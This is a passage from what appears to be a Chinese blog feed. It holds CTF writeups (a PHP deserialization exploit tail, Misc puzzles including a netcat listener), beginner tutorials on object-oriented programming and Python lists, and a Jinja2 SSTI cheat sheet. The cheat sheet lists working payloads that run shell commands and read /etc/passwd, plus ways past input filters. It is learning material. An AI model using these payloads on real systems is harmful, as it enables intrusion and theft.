class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> Open();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>


<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>打开附件看到一串16进制字符串，放到cyberchef里转一转</p>
<p><img src="https://i.loli.net/2021/03/23/utHhbQYmrPwe8JE.png"></p>
<p>把剩下的复制到sublime text</p>
<p><img src="https://i.loli.net/2021/03/23/oHuLIRyTnXF7MSa.png" alt="image-20210323171836395"></p>
<p>看起来有点扁，放到画图软件里拉宽一下</p>
<p><img src="https://i.loli.net/2021/03/23/Hnav8yB4hPeTJQV.png" alt="image-20210323171933445"></p>
<p>可以清晰的看到flag</p>
<blockquote>
<p>Nep{Y0u_ar3_50_cl3ver!}</p>
</blockquote>
<h3 id="我是间谍2nd"><a href="#我是间谍2nd" class="headerlink" title="我是间谍2nd"></a>我是间谍2nd</h3><p>下载的附件直接打开显示出了一句话</p>
<p>**connecting to 223.223.223.223:6001 **</p>
<p>那咱就修改一下ip为223.223.223.223</p>
<p><img src="https://i.loli.net/2021/03/20/y8eCNGzUJhRFmVZ.png"></p>
<p>然后用netcat开监听，并运行文件</p>
<blockquote>
<p>nc -lvvp 6001</p>
</blockquote>
<p>发现有回响</p>
<p><img src="https://i.loli.net/2021/03/20/I7VFOUe6XrJZoc4.png"></p>
<p>连接可得到flag</p>
<blockquote>
<p>Nep{XVlBzgbaiCMRAjWwhTHctcuAxhxKQFDaFpLSjFbcXoEF}</p>
</blockquote>
<h3 id="出题人日记"><a href="#出题人日记" class="headerlink" title="出题人日记"></a>出题人日记</h3><p>打开附件后解压压缩包内容，发现是个.xlsx文件，拿010打开后查看文件头可以知道其实是一个.zip压缩文件</p>
<p>更改文件扩展名后解压缩</p>
<p>tips：这里打开压缩包的时候是有一个hint的，但是不能拿默认的解压缩软件打开，不然看不到备注</p>
<p><img src="https://i.loli.net/2021/03/24/xaPKZA3yI7kGT8v.png"></p>
<p>发现这个hint还被编码过了，拿去cyberchef解码一下</p>
<p><img src="https://i.loli.net/2021/03/24/pyd5CD7FhtfI68u.png"></p>
<p>然后去google直接搜索Steganography.js</p>
<p><a href="https://www.peter-eigenschink.at/projects/steganographyjs/showcase/">https://www.peter-eigenschink.at/projects/steganographyjs/showcase/</a></p>
<p>然后直接在王章内解密就可以得到flag了</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Nepnep</tag>
      </tags>
  </entry>
  <entry>
    <title>面向对象思想学习</title>
    <url>/2021/01/26/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="面向对象思想学习"><a href="#面向对象思想学习" class="headerlink" title="面向对象思想学习"></a>面向对象思想学习</h1><h2 id="面向对象主要包括七个关键词"><a href="#面向对象主要包括七个关键词" class="headerlink" title="面向对象主要包括七个关键词"></a>面向对象主要包括七个关键词</h2><p>这七个关键词为：数据、方法、对象、类、封装、继承、多态。</p>
<a id="more"></a>
<h3 id="1、数据"><a href="#1、数据" class="headerlink" title="1、数据"></a>1、数据</h3><p>根据百度百科得知，数据(data)是信息的<strong>表现形式</strong>和<strong>载体</strong>，是事实或观察的结果，是对客观事物的逻辑归纳，是用于表示客观事物的未经加工的原始素材。<br>例如：学生的档案信息，数字：0，1，2，3等，天气预报上的气温温度，诸如此类都可称为数据。<br>而数据进行加工后，就形成了信息。在计算机中，数据是以二进制信息单元0，1进行表示。</p>
<h3 id="2、方法"><a href="#2、方法" class="headerlink" title="2、方法"></a>2、方法</h3><p>方法的基本解析是指为获得某种东西或达到某种目的而采取的<strong>途径</strong>，<strong>步骤</strong>和<strong>手段</strong>，而在软件编程语言中，如果将函数定义为类的一部分或者将函数与某个对象绑定，那么该函数就称之为<strong>方法</strong>。<br>方法简单来说，就是你写ACM题的时候自己写的算法，就像为了减少程序运行时间，为了防止TLE，有时候需要自己写一个快速幂函数，这就可以称作方法，为了达成某种目的而去制作能达成这个目的的方式。d=====(￣▽￣*)b</p>
<h3 id="3、对象"><a href="#3、对象" class="headerlink" title="3、对象"></a>3、对象</h3><p>对象的基本解析是特定人或物，在计算机语言中表现为客观世界中真实存在的人或者物体，在计算机中的逻辑映射。<br>对象可以理解为，在生活中，每个人都是一个对象，每件东西也都是一个对象，可以说<strong>万物皆对象</strong>。在面向对象编程语言中，对象是系统中的基本运行实体，是代码和数据的集合。</p>
<h3 id="4、类"><a href="#4、类" class="headerlink" title="4、类"></a>4、类</h3><p>类简单来说就是分类。在面向对象中，类是实现信息封装的基础，类是一种引用数据类型，也称类类型。每个类包含数据说明和一组操作数据的方法，而上面说的对象则是类的一种实例。<br>举个例子，人类就是一个基本的类类型，而每个人则是这个类类型的实例，也就是对象，人类这个类包含有姓名、性别、年龄等等这些<strong>数据</strong>说明，同时也有走路、吃饭、工作这些传递能量信息的<strong>方法</strong>。</p>
<h3 id="5、封装"><a href="#5、封装" class="headerlink" title="5、封装"></a>5、封装</h3><p>封装是对某一类事物进行抽象描述。封装是个动词，通过将姓名、性别、年龄等这些属性抽象到人类这个类类型的过程就叫封装。当我们一说到人类，就能联想到这个人叫什么名字、是男是女、多大年纪等等。同时封装也能隐藏人身上的一些特殊属性，比如：这个人身上有多少钱，这是我们不可得知的。</p>
<h3 id="6、继承"><a href="#6、继承" class="headerlink" title="6、继承"></a>6、继承</h3><p>继承就是子类继承父类的特征行为，使得子类对象（实例）具有父类的属性和方法，或子类从父类继承方法，使得子类具有父类相同的行为。同时，子类不仅可以继承父类全部的功能，还可以创建增加新数据、新功能。</p>
<blockquote>
<p>注意：子类继承父类的功能时，不能选择性的继承父类的部分功能，继承是类与类之间的关系，不是对象与对象之间的关系。</p>
</blockquote>
<p>例如：你自己，继承了你父亲的姓名，性别，年龄等这些<strong>属性</strong>，但是你在继承这些属性的同时增加了你会写代码的这么一个方法，而这个写代码的方法是你自己独有的，你的父亲并不具备这个写代码的这个功能。这就是继承。</p>
<h3 id="7、多态"><a href="#7、多态" class="headerlink" title="7、多态"></a>7、多态</h3><p>讲多态前，需要知道接口这一知识点。<br>接口，是一种特殊的类，在这个类中指定必须做什么，但不用规定它如何去做，而多态就是以多种方式告诉这个接口类该如何去做。</p>
<blockquote>
<p>例如：定义一个接口类，这个类中只有一个吃饭的方法，所以我们可以知道这个类中必须要做吃饭这件事，但是吃什么，怎么吃，在哪里吃？这里就可以通过多态来实现了，我们可以再定义两个类去实现这个接口，一个类告诉它我要去中餐厅用筷子吃鱼，另一个类告诉它我要去西餐厅用刀叉吃牛排</p>
</blockquote>
<p>简而言之，多态就是自定义多个方法使接口类实现一件事情的达成。φ(*￣0￣)</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>面向对象其实就是环绕类进行拓展，将数据、方法封装进类中，而类又可以创建对象。多态则可以使类增加多种不同的方法，而继承可以使类在原有基础上进行扩展，使类拥有更多的属性、方法。</p>
]]></content>
      <categories>
        <category>编程学习</category>
      </categories>
      <tags>
        <tag>other</tag>
      </tags>
  </entry>
  <entry>
    <title>python列表的运用</title>
    <url>/2021/02/01/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/python%E5%88%97%E8%A1%A8%E7%9A%84%E8%BF%90%E7%94%A8/</url>
    <content><![CDATA[<h2 id="python列表的运用"><a href="#python列表的运用" class="headerlink" title="python列表的运用"></a>python列表的运用</h2><p>列表是python中内置的序列类型，与C语言中的数组有些类似，但实际上python中的列表更像是一种类，其中封装了许多种方法。</p>
<a id="more"></a>

<h3 id="1、如何定义一个列表list"><a href="#1、如何定义一个列表list" class="headerlink" title="1、如何定义一个列表list"></a>1、如何定义一个列表list</h3><p>这是最简单的列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201113758182.png"></p>
<p>还可以数字与字符串混搭</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list2 = [<span class="number">1</span>, <span class="string">&#x27;red&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="number">3</span>, <span class="string">&#x27;yellow&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201113806526.png"></p>
<p>甚至可以在列表里加入列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list3 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e6a1a8840f884dd719dc49cd2ac0aa2f.png"></p>
<h3 id="2、列表的使用方法"><a href="#2、列表的使用方法" class="headerlink" title="2、列表的使用方法"></a>2、列表的使用方法</h3><h4 id="1、删除列表元素"><a href="#1、删除列表元素" class="headerlink" title="1、删除列表元素"></a>1、删除列表元素</h4><p>我们可以通过del语句来删除列表中的元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> list1[<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/cffcf388ca09f9c1152bed3187aca396.png"></p>
<p>tips:学过c语言的数组，我们都知道<strong>数组</strong>的下标是从0开始的，同样python中的<strong>列表</strong>也不例外，所以</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> list1[<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<p>删除的是下标为4的元素</p>
<h4 id="2、列表脚本操作符"><a href="#2、列表脚本操作符" class="headerlink" title="2、列表脚本操作符"></a>2、列表脚本操作符</h4><h5 id="1、长度操作"><a href="#1、长度操作" class="headerlink" title="1、长度操作"></a>1、长度操作</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">len</span>(list1)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b873434af888df2abe5f73ff6be3d7ca.png"></p>
<h5 id="2、组合操作符"><a href="#2、组合操作符" class="headerlink" title="2、组合操作符"></a>2、组合操作符</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 + [<span class="number">5</span>] 或 [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>] + [<span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021020111382871.png"></p>
<h5 id="3、重复操作符"><a href="#3、重复操作符" class="headerlink" title="3、重复操作符"></a>3、重复操作符</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 * <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/9129a2667adb0aa5630a45ee35d15996.png"></p>
<h5 id="4、内置迭代器"><a href="#4、内置迭代器" class="headerlink" title="4、内置迭代器"></a>4、内置迭代器</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> list1: print(x, end=<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/0592770187d406e3d1a9a72037366032.png"></p>
<h5 id="5、判断元素是否存在于表中"><a href="#5、判断元素是否存在于表中" class="headerlink" title="5、判断元素是否存在于表中"></a>5、判断元素是否存在于表中</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span> <span class="keyword">in</span> list1</span><br><span class="line"><span class="number">5</span> <span class="keyword">not</span> <span class="keyword">in</span> list1</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201113843302.png"></p>
<p>tips：从这看，python这也太人性化了w(ﾟДﾟ)w</p>
<h4 id="3、列表的截取取与拼接"><a href="#3、列表的截取取与拼接" class="headerlink" title="3、列表的截取取与拼接"></a>3、列表的截取取与拼接</h4><h5 id="1、列表的截取"><a href="#1、列表的截取" class="headerlink" title="1、列表的截取"></a>1、列表的截取</h5><p>tips: python中的列表可以正向索引也可以反向索引。</p>
<p><strong>正向索引</strong><br><img src="https://img-blog.csdnimg.cn/20210201113855754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<p><strong>反向索引</strong><br><img src="https://img-blog.csdnimg.cn/20210201113931263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<p>所以，截取可以正向截取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201113951193.png"></p>
<p>可以反向截取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/4887372c3996635cf4fd627a88de57eb.png"></p>
<p>还可以有范围的截取</p>
<p>tips：该范围为左闭右开区间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1[<span class="number">1</span>:<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7982975c1bcdcdc415a99e2248bec225.png"></p>
<p>甚至可以不加前后范围</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1[<span class="number">1</span>:]</span><br><span class="line">list1[:<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201114021435.png"></p>
<h5 id="2、列表的拼接"><a href="#2、列表的拼接" class="headerlink" title="2、列表的拼接"></a>2、列表的拼接</h5><p>列表里还支持拼接操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 += [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201114052460.png"></p>
<h4 id="4、列表函数"><a href="#4、列表函数" class="headerlink" title="4、列表函数"></a>4、列表函数</h4><h5 id="1、max"><a href="#1、max" class="headerlink" title="1、max()"></a>1、max()</h5><p>返回列表元素最大值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">max</span>(list1)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/4b557e1d41910ac90d7efc4d1a6ea605.png"></p>
<h5 id="2、min"><a href="#2、min" class="headerlink" title="2、min()"></a>2、min()</h5><p>返回列表元素最小值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">min</span>(list1)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/2b6e28cd5ccfaae5831f03044016f828.png"></p>
<h4 id="5、列表方法"><a href="#5、列表方法" class="headerlink" title="5、列表方法"></a>5、列表方法</h4><h5 id="1、list-append-obj"><a href="#1、list-append-obj" class="headerlink" title="1、list.append(obj)"></a>1、list.append(obj)</h5><p>在列表末尾添加新的对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.append(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/197986f29839747d215d40de04b8e512.png"></p>
<h5 id="2、list-count-obj"><a href="#2、list-count-obj" class="headerlink" title="2、list.count(obj)"></a>2、list.count(obj)</h5><p>统计某个元素在列表中出现的次数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.count(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/2be88d94904197ecd299d9df20189625.png"></p>
<h5 id="3、list-extend-seq"><a href="#3、list-extend-seq" class="headerlink" title="3、list.extend(seq)"></a>3、list.extend(seq)</h5><p> 在列表末尾一次性追加另一个序列中的多个值（即用新列表扩展原来的列表）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.extend([<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>])</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/eae8df9e0c929655831788391c0340f8.png"></p>
<h5 id="4、list-insert-index-obj"><a href="#4、list-insert-index-obj" class="headerlink" title="4、list.insert(index, obj)"></a>4、list.insert(index, obj)</h5><p>将对象插入列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.insert(<span class="number">1</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b6b5ec0f8e1185a25d4cbacea2a1e049.png"></p>
<h5 id="5、list-index-obj"><a href="#5、list-index-obj" class="headerlink" title="5、list.index(obj)"></a>5、list.index(obj)</h5><p>从列表中找出某个值第一个匹配项的索引位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.index(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a60c93533ddf9915804d32e89c1e0ffe.png"></p>
<p>也可以自定义范围</p>
<p>tips：该范围为左闭右开区间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.index(<span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b137c26fac142e9456dc28abcf5d4539.png"></p>
<h5 id="6、list-pop-index-1"><a href="#6、list-pop-index-1" class="headerlink" title="6、list.pop([index=-1])"></a>6、list.pop([index=-1])</h5><p>移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = list1.pop()</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b462e494f7b31f2c087f2f28cba64051.png"></p>
<h5 id="7、list-remove-obj"><a href="#7、list-remove-obj" class="headerlink" title="7、list.remove(obj)"></a>7、list.remove(obj)</h5><p>移除列表中某个值的<strong>第一个匹配项</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.remove(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/75a91400ec4d101794495e08b1689516.png"></p>
<h5 id="8、list-reverse"><a href="#8、list-reverse" class="headerlink" title="8、list.reverse()"></a>8、list.reverse()</h5><p>反向列表中的元素，但不会排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.reverse()</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201112643577.png"></p>
<h5 id="9、list-sort-key-None-reverse-False"><a href="#9、list-sort-key-None-reverse-False" class="headerlink" title="9、list.sort(key=None, reverse=False)"></a>9、list.sort(key=None, reverse=False)</h5><p>对原列表进行排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.sort()</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/202102011129474.png"><br>也可以反向排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.sort(reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201113107565.png"></p>
<h5 id="10、list-clear"><a href="#10、list-clear" class="headerlink" title="10、list.clear()"></a>10、list.clear()</h5><p>清空列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.clear()</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201113429421.png"></p>
<h5 id="11、list-copy"><a href="#11、list-copy" class="headerlink" title="11、list.copy()"></a>11、list.copy()</h5><p>复制列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.copy()</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201113614734.png"></p>
]]></content>
      <categories>
        <category>编程学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>模板注入(SSTI)的简单总结</title>
    <url>/2021/03/26/web%E5%AD%A6%E4%B9%A0/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="模板注入-SSTI-的简单总结"><a href="#模板注入-SSTI-的简单总结" class="headerlink" title="模板注入(SSTI)的简单总结"></a>模板注入(SSTI)的简单总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于现在还是萌新时期，这时候决定先写一篇关于模板注入的简单总结给自己用。</p>
<h2 id="SSTI的简单测试"><a href="#SSTI的简单测试" class="headerlink" title="SSTI的简单测试"></a>SSTI的简单测试</h2><p><img src="https://i.loli.net/2021/03/25/uwZaFe4Tx8MR6DG.png"></p>
<h2 id="各框架的模板结构"><a href="#各框架的模板结构" class="headerlink" title="各框架的模板结构"></a>各框架的模板结构</h2><p><img src="https://i.loli.net/2021/03/25/fRsgd7tD6mQNHyB.png"></p>
<h2 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>在缺省情况下，以下全局变量可以在 Jinja2 模板中使用：</p>
<ul>
<li><p><code>config</code></p>
<p>当前配置对象（ <code>flask.config</code> ）tips：这个变量总是可用，甚至是在被导入的模板中。</p>
</li>
<li><p><code>request</code></p>
<p>当前请求对象（ <code>flask.request</code> ）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p>
</li>
<li><p><code>session</code></p>
<p>当前会话对象（ <code>flask.session</code> ）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p>
</li>
<li><p><code>g</code></p>
<p>请求绑定的全局变量（ <code>flask.g</code>）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p>
</li>
<li><p><code>url_for()</code></p>
<p><code>flask.url_for()</code>函数。</p>
</li>
<li><p><code>get_flashed_messages()</code></p>
<p><code>flask.get_flashed_messages()</code> 函数。</p>
</li>
</ul>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>在python的SSTI中，大部分是依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti。</p>
<ul>
<li><code>__class__</code></li>
</ul>
<p>万物皆对象，而<strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class &#39;str&#39;&gt;</code>。</p>
<ul>
<li><code>__bases__</code></li>
</ul>
<p>以元组的形式返回一个类所直接继承的类。</p>
<ul>
<li><code>__mro__</code></li>
</ul>
<p>返回解析方法调用的顺序。</p>
<ul>
<li><code>__subclasses__()</code></li>
</ul>
<p>获取类的所有子类。</p>
<ul>
<li><code>__init__</code></li>
</ul>
<p>所有自带带类都包含<strong>init</strong>方法，便于利用他当跳板来调用<strong>globals</strong>。</p>
<ul>
<li><code>__globals__</code></li>
</ul>
<p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。</p>
<h3 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;cat /fl4g|base64&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><h4 id="测试SSTI过滤"><a href="#测试SSTI过滤" class="headerlink" title="测试SSTI过滤"></a>测试SSTI过滤</h4><p><code>&#123;&#123;"要测试的字符"&#125;&#125;</code>，只需要看看要测试的字符是否返回在页面中即可，下面分别说说对应各种过滤情况的解决办法。</p>
<h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤 "></a>过滤 </h4><p>使用<code>&#123;%`进行绕过，`&#123;%%&#125;</code>中间执行if语句可以起到类似盲注的效果</p>
<h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤_"></a>过滤<code>_</code></h4><p>可以用编码绕过</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">#如下</span></span><br><span class="line">__class__ =&gt; &#x27;\x5f\x5fclass\x5f\x5f&#x27;</span><br></pre></td></tr></table></figure>
<p><code>_</code> =&gt; <code>\x5f</code> ， <code>.</code> =&gt; <code>\x2e</code></p>
<p>过滤了_可以用<code>request[&#39;args&#39;]</code>或者<code>request[&#39;values&#39;]绕过</code></p>
<p>如果过滤了<code>args</code>也可以<code>request[&#39;values&#39;]</code>结合<code>attr()</code>绕过</p>
<p>如：<code>&#39;&#39;.__class__</code> 可以写成 <code>&#39;&#39;|attr(request[&#39;values&#39;][&#39;x1&#39;])</code>，然后POST传入<code>x1=__class__</code></p>
<h4 id="过滤-2"><a href="#过滤-2" class="headerlink" title="过滤."></a>过滤<code>.</code></h4><p>可以用<code>attr()</code>或<code>[]</code>绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 例如</span></span><br><span class="line"><span class="comment"># 正常的payload</span></span><br><span class="line">url?name=&#123;&#123;().__class__.__base__.__subclasses__[177].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ipconfig&quot;).read()&#x27;)&#125;&#125;`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用attr()绕过</span></span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">177</span>)|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用[]绕过</span></span><br><span class="line">url?name=&#123;&#123; config[&#x27;__class__&#x27;][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;ipconfig&#x27;)[&#x27;read&#x27;]() &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># tips：</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__ 可以写成 <span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;__class__&quot;</span>) 或者 <span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;__class__&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="过滤-3"><a href="#过滤-3" class="headerlink" title="过滤[]"></a>过滤<code>[]</code></h4><p>可以使用<code>getitem()</code>来获取序号</p>
